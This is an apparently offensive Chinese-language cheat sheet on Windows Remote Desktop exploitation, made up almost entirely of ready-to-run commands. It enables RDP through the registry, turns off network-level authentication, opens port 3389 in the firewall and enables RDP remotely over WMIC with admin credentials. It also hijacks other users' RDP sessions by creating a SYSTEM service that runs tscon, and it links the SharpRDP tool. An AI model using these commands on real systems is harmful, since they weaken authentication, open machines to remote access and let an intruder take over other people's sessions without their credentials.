# 远程桌面利用

#### 远程桌面开启

开启远程桌面连接功能

```
reg add "HKLM\SYSTEM\CurrentControlset\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

关闭"仅运行网络级别身份验证的远程桌面的计算机连接"

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
```

设置防火墙策略3389端口

```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

**WMI远程开启(需要提前知道计算机名)：**

```
wmic /Node:10.10.10.22 /User:Administrator /PassWord:P@SSw0rd! RDTOGGLE WHERE ServerName='Web-2' call SetAllowConnections 1
```

#### RDP Hijacking(会话劫持)

* 攻击者可以通过可以特权提升至 SYSTEM 权限的用户，可以在不知道其他用户登录凭据的情况下，用来劫持其他用户的 RDP 会话
* 利用条件只需要获取机器system权限执行tscon命令

创建劫持用户会话的服务

```
sc create rdp binpath= "cmd.exe /k tscon 2 /dest:console"
sc qc rdp  
sc start rdp
```

**SharpRDP**

https://github.com/0xthirteen/SharpRDP

用于执行经过身份验证的命令的远程桌面协议控制台应用程序
